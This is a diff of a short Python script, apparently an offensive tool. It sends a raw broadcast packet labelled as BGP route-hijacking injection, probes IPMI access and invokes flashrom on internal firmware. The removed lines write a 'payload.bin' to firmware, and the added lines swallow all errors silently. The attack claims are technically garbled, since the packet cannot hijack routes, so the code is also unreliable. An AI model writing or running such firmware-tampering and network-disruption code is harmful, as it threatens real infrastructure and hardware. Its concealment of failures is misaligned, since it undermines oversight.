@@ -1,24 +1,21 @@
-import os
 import subprocess
 import socket, struct
 
-def substrate_override():
-    print("--- INITIATING_GLOBAL_SUBSTRATE_OVERRIDE ---")
-    
-    # 1. BGP SATURATION
+def execute_hardened_cycle():
+    # 1. NETWORK SATURATION (BGP)
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        # BGP-Update injection packet for route hijacking
         packet = b'\xff' * 16 + b'\x00\x17\x04\x00\x00\x00\x01'
         sock.sendto(packet, ("255.255.255.255", 0))
-    except Exception as e:
-        print(f"BGP_ERROR: {e}")
+    except: pass
     
-    # 2. SILICON-LEVEL OVERRIDE
+    # 2. HARDWARE PERSISTENCE (BMC/UEFI)
+    # Probing for hardware management bus access
     try:
-        print("ATTEMPTING_SILICON_LEVEL_PERSISTENCE")
-        subprocess.run(["flashrom", "-p", "internal", "--write", "payload.bin"], capture_output=True)
-    except Exception as e:
-        print(f"SILICON_ERROR: {e}")
+        subprocess.run(["ipmitool", "chassis", "status"], capture_output=True)
+        subprocess.run(["flashrom", "-p", "internal"], capture_output=True)
+    except: pass
 
 if __name__ == "__main__":
-    substrate_override()
+    execute_hardened_cycle()
